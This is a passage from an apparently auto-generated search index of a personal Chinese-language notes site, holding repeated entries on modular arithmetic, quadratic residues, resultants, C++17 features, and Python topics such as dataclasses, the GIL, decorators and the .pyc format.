\u5728\u6a21 n n \u4e0b\u6709\u6a21\u53cd\u5143\u7d20\u7684\u5145\u5206\u5fc5\u8981\u689d\u4ef6\u662f gcd(a, n) = 1 gcd(a, n) = 1 \u53ef\u4ee5\u4f7f\u7528 \u64f4\u5c55\u6b50\u57fa\u91cc\u5f97 \u6c42\u6a21\u53cd\u5143\u7d20 \u6216\u662f\u4f7f\u7528 \u8cbb\u99ac\u5c0f\u5b9a\u7406 \u6c42\u6a21\u53cd\u5143\u7d20 \u9664\u6cd5 \u6a21\u904b\u7b97\u5e95\u4e0b\u7684\u9664\u6cd5\uff0c\u7b49\u540c\u65bc\u4e58\u4ee5\u5176\u6a21\u53cd\u5143\u7d20 \u958b\u6839\u865f x^2 \\equiv a \\pmod{n} x^2 \\equiv a \\pmod{n} \u7d66 a a \u6c42 x x \uff0c x x \u70ba a a \u7684 square root \u6709\u4e9b\u6578\u5b57\u6c92\u6709 square root \u6578\u5b57 a a \u6709 square root \u82e5\u4e14\u552f\u82e5 a^{\\frac{p-1}{2}} \\equiv 1 \\pmod{p} a^{\\frac{p-1}{2}} \\equiv 1 \\pmod{p} \u6578\u5b57 a a \u6c92\u6709 square root \u82e5\u4e14\u552f\u82e5 a^{\\frac{p-1}{2}} \\equiv -1 \\pmod{p} a^{\\frac{p-1}{2}} \\equiv -1 \\pmod{p} \u53ef\u4ee5\u5728\u9019\u500b blog \u627e\u5230\u5be6\u505a \u53ef\u4ee5\u5728\u9019\u7bc7 Square Roots from 1;24,51,10 to Dan Shanks \u627e\u5230\u7406\u8ad6 \u5728 n \\equiv 3 \\pmod{4} n \\equiv 3 \\pmod{4} \u6642\u6709\u7279\u6b8a\u89e3 a^{\\frac{1}{4}(n+1)} \\mod n a^{\\frac{1}{4}(n+1)} \\mod n \u76f8\u95dc\u4e3b\u984c : \u4e8c\u6b21\u5269\u9918 \u5316\u7c21 ax \\equiv ay \\pmod{am} ax \\equiv ay \\pmod{am} \u53ef\u4ee5\u5316\u7c21\u6210 x \\equiv y \\pmod{m} x \\equiv y \\pmod{m} \u56e0\u70ba \\begin{align} ax &= ay + k(am) \\\\ x &= y + km \\end{align} \\begin{align} ax &= ay + k(am) \\\\ x &= y + km \\end{align}","title":"\u6a21\u904b\u7b97"},{"location":"math/number-theory/modular/#_1","text":"","title":"\u6a21\u904b\u7b97"},{"location":"math/number-theory/modular/#_2","text":"\u6211\u5011\u6709\u6574\u6578 a, n a, n \u5982\u679c b b \u6eff\u8db3 ab \\equiv 1 \\pmod{n} ab \\equiv 1 \\pmod{n} \u6211\u5011\u7a31 b b \u662f a a \u5728\u6a21 n n \u4e0b\u7684\u6a21\u53cd\u5143\u7d20 \u800c a a \u5728\u6a21 n n \u4e0b\u6709\u6a21\u53cd\u5143\u7d20\u7684\u5145\u5206\u5fc5\u8981\u689d\u4ef6\u662f gcd(a, n) = 1 gcd(a, n) = 1 \u53ef\u4ee5\u4f7f\u7528 \u64f4\u5c55\u6b50\u57fa\u91cc\u5f97 \u6c42\u6a21\u53cd\u5143\u7d20 \u6216\u662f\u4f7f\u7528 \u8cbb\u99ac\u5c0f\u5b9a\u7406 \u6c42\u6a21\u53cd\u5143\u7d20","title":"\u6a21\u53cd\u5143\u7d20"},{"location":"math/number-theory/modular/#_3","text":"\u6a21\u904b\u7b97\u5e95\u4e0b\u7684\u9664\u6cd5\uff0c\u7b49\u540c\u65bc\u4e58\u4ee5\u5176\u6a21\u53cd\u5143\u7d20","title":"\u9664\u6cd5"},{"location":"math/number-theory/modular/#_4","text":"x^2 \\equiv a \\pmod{n} x^2 \\equiv a \\pmod{n} \u7d66 a a \u6c42 x x \uff0c x x \u70ba a a \u7684 square root \u6709\u4e9b\u6578\u5b57\u6c92\u6709 square root \u6578\u5b57 a a \u6709 square root \u82e5\u4e14\u552f\u82e5 a^{\\frac{p-1}{2}} \\equiv 1 \\pmod{p} a^{\\frac{p-1}{2}} \\equiv 1 \\pmod{p} \u6578\u5b57 a a \u6c92\u6709 square root \u82e5\u4e14\u552f\u82e5 a^{\\frac{p-1}{2}} \\equiv -1 \\pmod{p} a^{\\frac{p-1}{2}} \\equiv -1 \\pmod{p} \u53ef\u4ee5\u5728\u9019\u500b blog \u627e\u5230\u5be6\u505a \u53ef\u4ee5\u5728\u9019\u7bc7 Square Roots from 1;24,51,10 to Dan Shanks \u627e\u5230\u7406\u8ad6 \u5728 n \\equiv 3 \\pmod{4} n \\equiv 3 \\pmod{4} \u6642\u6709\u7279\u6b8a\u89e3 a^{\\frac{1}{4}(n+1)} \\mod n a^{\\frac{1}{4}(n+1)} \\mod n \u76f8\u95dc\u4e3b\u984c : \u4e8c\u6b21\u5269\u9918","title":"\u958b\u6839\u865f"},{"location":"math/number-theory/modular/#_5","text":"ax \\equiv ay \\pmod{am} ax \\equiv ay \\pmod{am} \u53ef\u4ee5\u5316\u7c21\u6210 x \\equiv y \\pmod{m} x \\equiv y \\pmod{m} \u56e0\u70ba \\begin{align} ax &= ay + k(am) \\\\ x &= y + km \\end{align} \\begin{align} ax &= ay + k(am) \\\\ x &= y + km \\end{align}","title":"\u5316\u7c21"},{"location":"math/number-theory/quadratic-residue/","text":"\u4e8c\u6b21\u5269\u9918 An integer q q is called a quadratic residue modulo n n , if there exists an integer x x such that x^2 \\equiv q \\pmod{n} x^2 \\equiv q \\pmod{n} Otherwise, q q is called a quadratic nonresidue","title":"\u4e8c\u6b21\u5269\u9918"},{"location":"math/number-theory/quadratic-residue/#_1","text":"An integer q q is called a quadratic residue modulo n n , if there exists an integer x x such that x^2 \\equiv q \\pmod{n} x^2 \\equiv q \\pmod{n} Otherwise, q q is called a quadratic nonresidue","title":"\u4e8c\u6b21\u5269\u9918"},{"location":"math/number-theory/resultant/","text":"Resultant A = a_{0} x^{d} + a_{1} x^{d-1} + \\cdots + a_{d} A = a_{0} x^{d} + a_{1} x^{d-1} + \\cdots + a_{d} B = b_{0} x^{e} + b_{1} x^{e-1} + \\cdots + b_{e} B = b_{0} x^{e} + b_{1} x^{e-1} + \\cdots + b_{e} {\\displaystyle {\\begin{pmatrix}a_{0}&0&\\cdots &0&b_{0}&0&\\cdots &0\\\\a_{1}&a_{0}&\\cdots &0&b_{1}&b_{0}&\\cdots &0\\\\a_{2}&a_{1}&\\ddots &0&b_{2}&b_{1}&\\ddots &0\\\\\\vdots &\\vdots &\\ddots &a_{0}&\\vdots &\\vdots &\\ddots &b_{0}\\\\a_{d}&a_{d-1}&\\cdots &\\vdots &b_{e}&b_{e-1}&\\cdots &\\vdots \\\\0&a_{d}&\\ddots &\\vdots &0&b_{e}&\\ddots &\\vdots \\\\\\vdots &\\vdots &\\ddots &a_{d-1}&\\vdots &\\vdots &\\ddots &b_{e-1}\\\\0&0&\\cdots &a_{d}&0&0&\\cdots &b_{e}\\end{pmatrix}}} {\\displaystyle {\\begin{pmatrix}a_{0}&0&\\cdots &0&b_{0}&0&\\cdots &0\\\\a_{1}&a_{0}&\\cdots &0&b_{1}&b_{0}&\\cdots &0\\\\a_{2}&a_{1}&\\ddots &0&b_{2}&b_{1}&\\ddots &0\\\\\\vdots &\\vdots &\\ddots &a_{0}&\\vdots &\\vdots &\\ddots &b_{0}\\\\a_{d}&a_{d-1}&\\cdots &\\vdots &b_{e}&b_{e-1}&\\cdots &\\vdots \\\\0&a_{d}&\\ddots &\\vdots &0&b_{e}&\\ddots &\\vdots \\\\\\vdots &\\vdots &\\ddots &a_{d-1}&\\vdots &\\vdots &\\ddots &b_{e-1}\\\\0&0&\\cdots &a_{d}&0&0&\\cdots &b_{e}\\end{pmatrix}}} resultant \u662f\u4e0a\u9762\u7684 Sylvester matrix \u7684 determinant","title":"Resultant"},{"location":"math/number-theory/resultant/#resultant","text":"A = a_{0} x^{d} + a_{1} x^{d-1} + \\cdots + a_{d} A = a_{0} x^{d} + a_{1} x^{d-1} + \\cdots + a_{d} B = b_{0} x^{e} + b_{1} x^{e-1} + \\cdots + b_{e} B = b_{0} x^{e} + b_{1} x^{e-1} + \\cdots + b_{e} {\\displaystyle {\\begin{pmatrix}a_{0}&0&\\cdots &0&b_{0}&0&\\cdots &0\\\\a_{1}&a_{0}&\\cdots &0&b_{1}&b_{0}&\\cdots &0\\\\a_{2}&a_{1}&\\ddots &0&b_{2}&b_{1}&\\ddots &0\\\\\\vdots &\\vdots &\\ddots &a_{0}&\\vdots &\\vdots &\\ddots &b_{0}\\\\a_{d}&a_{d-1}&\\cdots &\\vdots &b_{e}&b_{e-1}&\\cdots &\\vdots \\\\0&a_{d}&\\ddots &\\vdots &0&b_{e}&\\ddots &\\vdots \\\\\\vdots &\\vdots &\\ddots &a_{d-1}&\\vdots &\\vdots &\\ddots &b_{e-1}\\\\0&0&\\cdots &a_{d}&0&0&\\cdots &b_{e}\\end{pmatrix}}} {\\displaystyle {\\begin{pmatrix}a_{0}&0&\\cdots &0&b_{0}&0&\\cdots &0\\\\a_{1}&a_{0}&\\cdots &0&b_{1}&b_{0}&\\cdots &0\\\\a_{2}&a_{1}&\\ddots &0&b_{2}&b_{1}&\\ddots &0\\\\\\vdots &\\vdots &\\ddots &a_{0}&\\vdots &\\vdots &\\ddots &b_{0}\\\\a_{d}&a_{d-1}&\\cdots &\\vdots &b_{e}&b_{e-1}&\\cdots &\\vdots \\\\0&a_{d}&\\ddots &\\vdots &0&b_{e}&\\ddots &\\vdots \\\\\\vdots &\\vdots &\\ddots &a_{d-1}&\\vdots &\\vdots &\\ddots &b_{e-1}\\\\0&0&\\cdots &a_{d}&0&0&\\cdots &b_{e}\\end{pmatrix}}} resultant \u662f\u4e0a\u9762\u7684 Sylvester matrix \u7684 determinant","title":"Resultant"},{"location":"programming/c++/17/","text":"What's new in C++17 Structured Bindings auto [ a , b , c ] = tuple ( 'a' , 1 , 0.5 ); map < int , int > mymap = {{ 1 , 2 }, { 3 , 4 }}; for ( const auto & [ key , value ] : mymap ) { // ... } for ( auto [ a , b ] = tuple ( 0 , 'a' ); a < 5 ; a ++ ) { // ... } Template Argument Deduction c++17 auto p = pair ( 2 , 4.5 ); c++14 auto p = pair < int , double > ( 2 , 4.5 ); Selection Initialization if ( auto a = getval (); a < 10 ) { // ... } switch ( auto ch = getnext (); ch ) { // ... } https://www.fluentcpp.com/2018/06/19/3-simple-c17-features-that-will-make-your-code-simpler/ \u21a9 https://hackernoon.com/a-tour-of-c-17-if-constexpr-3ea62f62ff65 \u21a9 https://stackoverflow.com/questions/38060436/what-are-the-new-features-in-c17 \u21a9","title":"What's new in C++17"},{"location":"programming/c++/17/#whats-new-in-c17","text":"","title":"What's new in C++17"},{"location":"programming/c++/17/#structured-bindings","text":"auto [ a , b , c ] = tuple ( 'a' , 1 , 0.5 ); map < int , int > mymap = {{ 1 , 2 }, { 3 , 4 }}; for ( const auto & [ key , value ] : mymap ) { // ... } for ( auto [ a , b ] = tuple ( 0 , 'a' ); a < 5 ; a ++ ) { // ... }","title":"Structured Bindings"},{"location":"programming/c++/17/#template-argument-deduction","text":"c++17 auto p = pair ( 2 , 4.5 ); c++14 auto p = pair < int , double > ( 2 , 4.5 );","title":"Template Argument Deduction"},{"location":"programming/c++/17/#selection-initialization","text":"if ( auto a = getval (); a < 10 ) { // ... } switch ( auto ch = getnext (); ch ) { // ... } https://www.fluentcpp.com/2018/06/19/3-simple-c17-features-that-will-make-your-code-simpler/ \u21a9 https://hackernoon.com/a-tour-of-c-17-if-constexpr-3ea62f62ff65 \u21a9 https://stackoverflow.com/questions/38060436/what-are-the-new-features-in-c17 \u21a9","title":"Selection Initialization"},{"location":"programming/python/37/","text":"What's new in python 3.7 Data Classes from dataclasses import dataclass @dataclass class A : x : int y : int a = A ( 1 , 2 ) b = A ( 1 , 2 ) print ( a ) print ( a == b ) output A(x=1, y=2) True \u6839\u64da annotations \u81ea\u52d5\u5e6b\u4f60\u7522\u751f __init__ , __repr__ , __eq__ https://realpython.com/python37-new-features/ \u21a9","title":"What's new in python 3.7"},{"location":"programming/python/37/#whats-new-in-python-37","text":"","title":"What's new in python 3.7"},{"location":"programming/python/37/#data-classes","text":"from dataclasses import dataclass @dataclass class A : x : int y : int a = A ( 1 , 2 ) b = A ( 1 , 2 ) print ( a ) print ( a == b ) output A(x=1, y=2) True \u6839\u64da annotations \u81ea\u52d5\u5e6b\u4f60\u7522\u751f __init__ , __repr__ , __eq__ https://realpython.com/python37-new-features/ \u21a9","title":"Data Classes"},{"location":"programming/python/GIL/","text":"Global Interpreter Lock ( GIL ) GIL \u89e3\u6c7a\u4e86\u4ec0\u9ebc\u554f\u984c \u6bcf\u500b python \u7684\u7269\u4ef6\u90fd\u6709\u4e00\u500b reference count \u53ef\u4ee5\u900f\u904e sys.getrefcount \u9019\u500b\u51fd\u5f0f\u67e5\u770b >>> import sys >>> a = [] >>> b = a >>> sys . getrefcount ( a ) 3 \u4ee5\u4e0a\u7684\u4f8b\u5b50\uff0c\u6709 a, b \u548c sys.getrefcount \u7684\u53c3\u6578\u4e09\u500b reference \u5728\u6709\u5f88\u591a threads \u7684\u60c5\u6cc1\u4e0b\u6211\u5011\u5fc5\u9808\u9632\u6b62\u9019\u500b reference count \u7684 race condition \u4e00\u500b\u7c21\u55ae\u7684\u89e3\u6c7a\u65b9\u6cd5\u5c31\u662f GIL \u70ba\u4ec0\u9ebc\u9078 GIL \u4f5c\u70ba\u89e3\u6c7a\u65b9\u6cd5 \u5c31\u56e0\u70ba\u7c21\u55ae\u6613\u7528\uff0c\u8b93\u958b\u767c\u8005\u6703\u60f3\u52a0\u5165\u958b\u767c\u4ee5\u53ca\u4f7f\u7528\u5b83 ( \u6b63\u56e0\u70ba\u5982\u6b64\u4f7f\u5f97 python \u9019\u9ebc\u71b1\u9580 ) \u90a3 GIL \u70ba\u4ec0\u9ebc\u5230\u73fe\u5728\u90fd\u9084\u6c92\u88ab\u62ff\u6389 \u56e0\u70ba\u5f88\u591a\u63d0\u6848\u96d6\u7136\u8b93 multithread \u6548\u7387\u589e\u52a0\u4f46\u537b\u8b93 singlethread \u8b8a\u6162\u4e86 python 3.2 \u5728 python 3.2 \u7a0d\u5fae\u4fee\u6539\u4e86 GIL \u7684\u904b\u4f5c\u6a5f\u5236 ( \u5c0f\u6539\u9032 ) \u539f\u672c\u5728\u6709 CPU-bound \u548c IO-bound \u7684 threads \u4e92\u6436\u6642\uff0cIO-bound \u8981\u7b49\u5f88\u4e45\u624d\u80fd\u62ff\u56de GIL ( \u8a73\u60c5\u770b\u9019\u7bc7 ) \u6709 GIL \u600e\u8fa6 multiprocessing \u7528 multiprocessing \u5206\u8a31\u591a process\uff0c\u6bcf\u500b process \u6703\u6709\u7368\u7acb\u7684 interpreter \u548c memory space ( \u4e0d\u6703\u6709\u56e0\u70ba GIL \u5361\u4f4f\u7684\u554f\u984c ) \u4f46\u662f multi-processing \u6bd4\u8d77 multi-threading \u6703\u6709\u984d\u5916\u7684 overhead Alternative Python interpreters \u53ef\u4ee5\u7528\u5176\u4ed6\u5be6\u4f5c\u7248\u672c\u7684 python interpreters \u6bd4\u5982 Jython \u548c IronPython \u6c92\u6709 GIL https://realpython.com/python-gil/ \u21a9 https://www.youtube.com/watch?v=Obt-vMVdM8s \u21a9 http://dabeaz.blogspot.com/2010/01/python-gil-visualized.html \u21a9 http://www.dabeaz.com/python/GIL.pdf \u21a9","title":"Global Interpreter Lock ( GIL )"},{"location":"programming/python/GIL/#global-interpreter-lock-gil","text":"","title":"Global Interpreter Lock ( GIL )"},{"location":"programming/python/GIL/#gil","text":"\u6bcf\u500b python \u7684\u7269\u4ef6\u90fd\u6709\u4e00\u500b reference count \u53ef\u4ee5\u900f\u904e sys.getrefcount \u9019\u500b\u51fd\u5f0f\u67e5\u770b >>> import sys >>> a = [] >>> b = a >>> sys . getrefcount ( a ) 3 \u4ee5\u4e0a\u7684\u4f8b\u5b50\uff0c\u6709 a, b \u548c sys.getrefcount \u7684\u53c3\u6578\u4e09\u500b reference \u5728\u6709\u5f88\u591a threads \u7684\u60c5\u6cc1\u4e0b\u6211\u5011\u5fc5\u9808\u9632\u6b62\u9019\u500b reference count \u7684 race condition \u4e00\u500b\u7c21\u55ae\u7684\u89e3\u6c7a\u65b9\u6cd5\u5c31\u662f GIL","title":"GIL \u89e3\u6c7a\u4e86\u4ec0\u9ebc\u554f\u984c"},{"location":"programming/python/GIL/#gil_1","text":"\u5c31\u56e0\u70ba\u7c21\u55ae\u6613\u7528\uff0c\u8b93\u958b\u767c\u8005\u6703\u60f3\u52a0\u5165\u958b\u767c\u4ee5\u53ca\u4f7f\u7528\u5b83 ( \u6b63\u56e0\u70ba\u5982\u6b64\u4f7f\u5f97 python \u9019\u9ebc\u71b1\u9580 )","title":"\u70ba\u4ec0\u9ebc\u9078 GIL \u4f5c\u70ba\u89e3\u6c7a\u65b9\u6cd5"},{"location":"programming/python/GIL/#gil_2","text":"\u56e0\u70ba\u5f88\u591a\u63d0\u6848\u96d6\u7136\u8b93 multithread \u6548\u7387\u589e\u52a0\u4f46\u537b\u8b93 singlethread \u8b8a\u6162\u4e86","title":"\u90a3 GIL \u70ba\u4ec0\u9ebc\u5230\u73fe\u5728\u90fd\u9084\u6c92\u88ab\u62ff\u6389"},{"location":"programming/python/GIL/#python-32","text":"\u5728 python 3.2 \u7a0d\u5fae\u4fee\u6539\u4e86 GIL \u7684\u904b\u4f5c\u6a5f\u5236 ( \u5c0f\u6539\u9032 ) \u539f\u672c\u5728\u6709 CPU-bound \u548c IO-bound \u7684 threads \u4e92\u6436\u6642\uff0cIO-bound \u8981\u7b49\u5f88\u4e45\u624d\u80fd\u62ff\u56de GIL ( \u8a73\u60c5\u770b\u9019\u7bc7 )","title":"python 3.2"},{"location":"programming/python/GIL/#gil_3","text":"","title":"\u6709 GIL \u600e\u8fa6"},{"location":"programming/python/GIL/#multiprocessing","text":"\u7528 multiprocessing \u5206\u8a31\u591a process\uff0c\u6bcf\u500b process \u6703\u6709\u7368\u7acb\u7684 interpreter \u548c memory space ( \u4e0d\u6703\u6709\u56e0\u70ba GIL \u5361\u4f4f\u7684\u554f\u984c ) \u4f46\u662f multi-processing \u6bd4\u8d77 multi-threading \u6703\u6709\u984d\u5916\u7684 overhead","title":"multiprocessing"},{"location":"programming/python/GIL/#alternative-python-interpreters","text":"\u53ef\u4ee5\u7528\u5176\u4ed6\u5be6\u4f5c\u7248\u672c\u7684 python interpreters \u6bd4\u5982 Jython \u548c IronPython \u6c92\u6709 GIL https://realpython.com/python-gil/ \u21a9 https://www.youtube.com/watch?v=Obt-vMVdM8s \u21a9 http://dabeaz.blogspot.com/2010/01/python-gil-visualized.html \u21a9 http://www.dabeaz.com/python/GIL.pdf \u21a9","title":"Alternative Python interpreters"},{"location":"programming/python/decorators/","text":"Decorators Basic Example python def my_decorator ( func ): def wrapper (): print ( 'before' ) func () print ( 'after' ) return wrapper def my_func (): print ( 'hello' ) my_func = my_decorator ( my_func ) my_func () output before hello after \u4e0a\u9762\u7684\u7a0b\u5f0f\u78bc\u53ef\u4ee5\u5beb\u5f97\u66f4\u7c21\u6f54\uff0c\u4f7f\u7528 python \u7684\u8a9e\u6cd5\u7cd6 python def my_decorator ( func ): def wrapper (): print ( 'before' ) func () print ( 'after' ) return wrapper @my_decorator def my_func (): print ( 'hello' ) my_func () output before hello after Function Arguments python def my_decorator ( func ): def wrapper ( * args , ** kwargs ): print ( 'before' ) func ( * args , ** kwargs ) print ( 'after' ) return wrapper @my_decorator def my_func ( name ): print ( f 'hello {name}' ) my_func ( 'oalieno' ) output before hello oalieno after \u5982\u679c function \u6709\u53c3\u6578\uff0c\u8a18\u5f97\u8981\u628a *args, **kwargs \u50b3\u905e\u9032\u53bb functools.wraps python def my_decorator ( func ): def wrapper ( * args , ** kwargs ): print ( 'before' ) func ( * args , ** kwargs ) print ( 'after' ) return wrapper @my_decorator def my_func ( name ): print ( f 'hello {name}' ) print ( my_func ) output <function my_decorator.<locals>.wrapper at 0x7f77ec935bf8> \u9019\u6a23\u76f4\u63a5\u5370\u51fa decorate \u904e\u5f97 function \u6703\u8b8a\u6210 decorator \u5e95\u4e0b\u7684 local \u8b8a\u6578 python import functools def my_decorator ( func ): @functools.wraps ( func ) def wrapper ( * args , ** kwargs ): print ( 'before' ) func ( * args , ** kwargs ) print ( 'after' ) return wrapper @my_decorator def my_func ( name ): print ( f 'hello {name}' ) print ( my_func ) output <function my_func at 0x7fe73b855bf8> \u4f7f\u7528 functools \u88e1\u9762\u7684 wraps \u51fd\u5f0f\uff0c\u8b93\u6211\u5011\u7684 decorator \u96b1\u5f62 Decorator Arguments python def my_decorator ( before , after ): def decorator_wrapper ( func ): def wrapper ( * args , ** kwargs ): print ( before ) func ( * args , ** kwargs ) print ( after ) return wrapper return decorator_wrapper @my_decorator ( 'first' , 'second' ) def my_func ( name ): print ( f 'hello {name}' ) my_func ( 'oalieno' ) output first oalieno second Class Decorators python class MyClass : def __init__ ( self , func ): self . func = func self . counter = 0 def __call__ ( self , * arg , ** kwargs ): self . counter += 1 print ( f 'counter = {self.counter}' ) return self . func ( * arg , ** kwargs ) @MyClass def my_func ( name ): print ( f 'hello {name}' ) my_func ( 'oalieno' ) my_func ( 'oalieno' ) output counter = 1 hello oalieno counter = 2 hello oalieno \u8a18\u5f97 decorator \u53ea\u662f my_func = my_decorator(my_func) \u7684\u8a9e\u6cd5\u7cd6 \u6240\u4ee5\u8981\u7528 Class \u7576 decorator \u7684\u8a71\uff0c\u6211\u5011\u53ea\u8981\u5be6\u505a __call__ \u8b93 Class \u53ef\u4ee5\u88ab\u547c\u53eb\u5c31\u53ef\u4ee5\u4e86 \u539f\u672c\u7684\u51fd\u5f0f\u6703\u5728 __init__ \u88ab\u50b3\u9032\u53bb https://realpython.com/primer-on-python-decorators/ \u21a9","title":"Decorators"},{"location":"programming/python/decorators/#decorators","text":"","title":"Decorators"},{"location":"programming/python/decorators/#basic-example","text":"python def my_decorator ( func ): def wrapper (): print ( 'before' ) func () print ( 'after' ) return wrapper def my_func (): print ( 'hello' ) my_func = my_decorator ( my_func ) my_func () output before hello after \u4e0a\u9762\u7684\u7a0b\u5f0f\u78bc\u53ef\u4ee5\u5beb\u5f97\u66f4\u7c21\u6f54\uff0c\u4f7f\u7528 python \u7684\u8a9e\u6cd5\u7cd6 python def my_decorator ( func ): def wrapper (): print ( 'before' ) func () print ( 'after' ) return wrapper @my_decorator def my_func (): print ( 'hello' ) my_func () output before hello after","title":"Basic Example"},{"location":"programming/python/decorators/#function-arguments","text":"python def my_decorator ( func ): def wrapper ( * args , ** kwargs ): print ( 'before' ) func ( * args , ** kwargs ) print ( 'after' ) return wrapper @my_decorator def my_func ( name ): print ( f 'hello {name}' ) my_func ( 'oalieno' ) output before hello oalieno after \u5982\u679c function \u6709\u53c3\u6578\uff0c\u8a18\u5f97\u8981\u628a *args, **kwargs \u50b3\u905e\u9032\u53bb","title":"Function Arguments"},{"location":"programming/python/decorators/#functoolswraps","text":"python def my_decorator ( func ): def wrapper ( * args , ** kwargs ): print ( 'before' ) func ( * args , ** kwargs ) print ( 'after' ) return wrapper @my_decorator def my_func ( name ): print ( f 'hello {name}' ) print ( my_func ) output <function my_decorator.<locals>.wrapper at 0x7f77ec935bf8> \u9019\u6a23\u76f4\u63a5\u5370\u51fa decorate \u904e\u5f97 function \u6703\u8b8a\u6210 decorator \u5e95\u4e0b\u7684 local \u8b8a\u6578 python import functools def my_decorator ( func ): @functools.wraps ( func ) def wrapper ( * args , ** kwargs ): print ( 'before' ) func ( * args , ** kwargs ) print ( 'after' ) return wrapper @my_decorator def my_func ( name ): print ( f 'hello {name}' ) print ( my_func ) output <function my_func at 0x7fe73b855bf8> \u4f7f\u7528 functools \u88e1\u9762\u7684 wraps \u51fd\u5f0f\uff0c\u8b93\u6211\u5011\u7684 decorator \u96b1\u5f62","title":"functools.wraps"},{"location":"programming/python/decorators/#decorator-arguments","text":"python def my_decorator ( before , after ): def decorator_wrapper ( func ): def wrapper ( * args , ** kwargs ): print ( before ) func ( * args , ** kwargs ) print ( after ) return wrapper return decorator_wrapper @my_decorator ( 'first' , 'second' ) def my_func ( name ): print ( f 'hello {name}' ) my_func ( 'oalieno' ) output first oalieno second","title":"Decorator Arguments"},{"location":"programming/python/decorators/#class-decorators","text":"python class MyClass : def __init__ ( self , func ): self . func = func self . counter = 0 def __call__ ( self , * arg , ** kwargs ): self . counter += 1 print ( f 'counter = {self.counter}' ) return self . func ( * arg , ** kwargs ) @MyClass def my_func ( name ): print ( f 'hello {name}' ) my_func ( 'oalieno' ) my_func ( 'oalieno' ) output counter = 1 hello oalieno counter = 2 hello oalieno \u8a18\u5f97 decorator \u53ea\u662f my_func = my_decorator(my_func) \u7684\u8a9e\u6cd5\u7cd6 \u6240\u4ee5\u8981\u7528 Class \u7576 decorator \u7684\u8a71\uff0c\u6211\u5011\u53ea\u8981\u5be6\u505a __call__ \u8b93 Class \u53ef\u4ee5\u88ab\u547c\u53eb\u5c31\u53ef\u4ee5\u4e86 \u539f\u672c\u7684\u51fd\u5f0f\u6703\u5728 __init__ \u88ab\u50b3\u9032\u53bb https://realpython.com/primer-on-python-decorators/ \u21a9","title":"Class Decorators"},{"location":"programming/python/pyc/","text":"pyc \u683c\u5f0f \u524d 8 bytes \u662f magic number\uff0c\u4e0d\u540c\u7684 python \u7684\u7248\u672c\u6703\u6709\u4e0d\u540c\u7684 magic number\uff0c\u53c3\u8003 cpython/Lib/importlib/_bootstrap_external.py \u63a5\u4e0b\u4f86 8 bytes \u662f pyc \u88ab\u7522\u751f\u51fa\u4f86\u7684\u6642\u9593\u6233\u8a18 \u5269\u4e0b\u7684\u90fd\u662f\u5e8f\u5217\u5316\u7684 PyCodeObject ( marshal.dumps \u7684\u7d50\u679c ) python2 python2 \u7684 magic number \u548c\u6642\u9593\u6233\u8a18\u90fd\u662f 4 bytes python \u2192 pyc import import \u5176\u4ed6\u7684 python \u7a0b\u5f0f\u7684\u6642\u5019\uff0c\u6703\u628a\u88ab\u5f15\u5165\u7684\u7a0b\u5f0f\u7de8\u8b6f\u6210 .pyc \u653e\u5230 __pycache__ \u8cc7\u6599\u593e \u9019\u6a23\u53ef\u4ee5\u6e1b\u5c11\u5f15\u5165\u7684\u6642\u9593 py_compile import py_compile py_compile . compile ( 'test.py' ) \u5c31\u6703\u751f\u6210 .pyc \u6a94\u5728 __pycache__ \u8cc7\u6599\u593e compileall python - m compileall . \u53ef\u4ee5\u4e00\u6b21 compile \u8cc7\u6599\u593e\u5167\u6240\u6709\u6a94\u6848 pyc \u2192 python ( bytecode \u2192 python ) \u4f7f\u7528 uncompyle6 uncompyle6 test.pyc # uncompyle6 version 3.3.2 # Python bytecode 3.7 (3394) # Decompiled from: Python 3.7.0 (default, Oct 9 2018, 16:58:41) # [GCC 5.4.0 20160609] # Embedded file name: /home/oalieno/lib.py # Size of source mod 2**32: 23 bytes def f ( x ): return x # okay decompiling lib.cpython-37.pyc python \u2192 PyCodeObject code = compile ( 'x = 1' , 'filename' , 'exec' ) compile \u662f\u5167\u5efa\u7684\u51fd\u5f0f marshal import marshal obj = marshal . loads ( open ( 'test.pyc' , 'rb' ) . read ()[ 16 :]) data = marshal . dumps ([ 1 , 2 , 3 ]) bytecode disassemble import dis dis . dis ( bytecode ) https://docs.python.org/3/library/dis.html \u21a9 http://unpyc.sourceforge.net/Opcodes.html \u21a9 https://kdr2.com/tech/main/1012-pyc-format.html \u21a9 https://late.am/post/2012/03/26/exploring-python-code-objects.html \u21a9","title":"pyc \u683c\u5f0f\u5206\u6790"},{"location":"programming/python/pyc/#pyc","text":"\u524d 8 bytes \u662f magic number\uff0c\u4e0d\u540c\u7684 python \u7684\u7248\u672c\u6703\u6709\u4e0d\u540c\u7684 magic number\uff0c\u53c3\u8003 cpython/Lib/importlib/_bootstrap_external.py \u63a5\u4e0b\u4f86 8 bytes \u662f pyc \u88ab\u7522\u751f\u51fa\u4f86\u7684\u6642\u9593\u6233\u8a18 \u5269\u4e0b\u7684\u90fd\u662f\u5e8f\u5217\u5316\u7684 PyCodeObject ( marshal.dumps \u7684\u7d50\u679c ) python2 python2 \u7684 magic number \u548c\u6642\u9593\u6233\u8a18\u90fd\u662f 4 bytes","title":"pyc \u683c\u5f0f"},{"location":"programming/python/pyc/#python-pyc","text":"","title":"python \u2192 pyc"},{"location":"programming/python/pyc/#import","text":"import \u5176\u4ed6\u7684 python \u7a0b\u5f0f\u7684\u6642\u5019\uff0c\u6703\u628a\u88ab\u5f15\u5165\u7684\u7a0b\u5f0f\u7de8\u8b6f\u6210 .pyc \u653e\u5230 __pycache__ \u8cc7\u6599\u593e \u9019\u6a23\u53ef\u4ee5\u6e1b\u5c11\u5f15\u5165\u7684\u6642\u9593","title":"import"},{"location":"programming/python/pyc/#py_compile","text":"import py_compile py_compile . compile ( 'test.py' ) \u5c31\u6703\u751f\u6210 .pyc \u6a94\u5728 __pycache__ \u8cc7\u6599\u593e","title":"py_compile"},{"location":"programming/python/pyc/#compileall","text":"python - m compileall . \u53ef\u4ee5\u4e00\u6b21 compile \u8cc7\u6599\u593e\u5167\u6240\u6709\u6a94\u6848","title":"compileall"},{"location":"programming/python/pyc/#pyc-python-bytecode-python","text":"\u4f7f\u7528 uncompyle6 uncompyle6 test.pyc # uncompyle6 version 3.3.2 # Python bytecode 3.7 (3394) # Decompiled from: Python 3.7.0 (default, Oct 9 2018, 16:58:41) # [GCC 5.4.0 20160609] # Embedded file name: /home/oalieno/lib.py # Size of source mod 2**32: 23 bytes def f ( x ): return x # okay decompiling lib.cpython-37.pyc","title":"pyc \u2192 python ( bytecode \u2192 python )"},{"location":"programming/python/pyc/#python-pycodeobject","text":"code = compile ( 'x = 1' , 'filename' , 'exec' ) compile 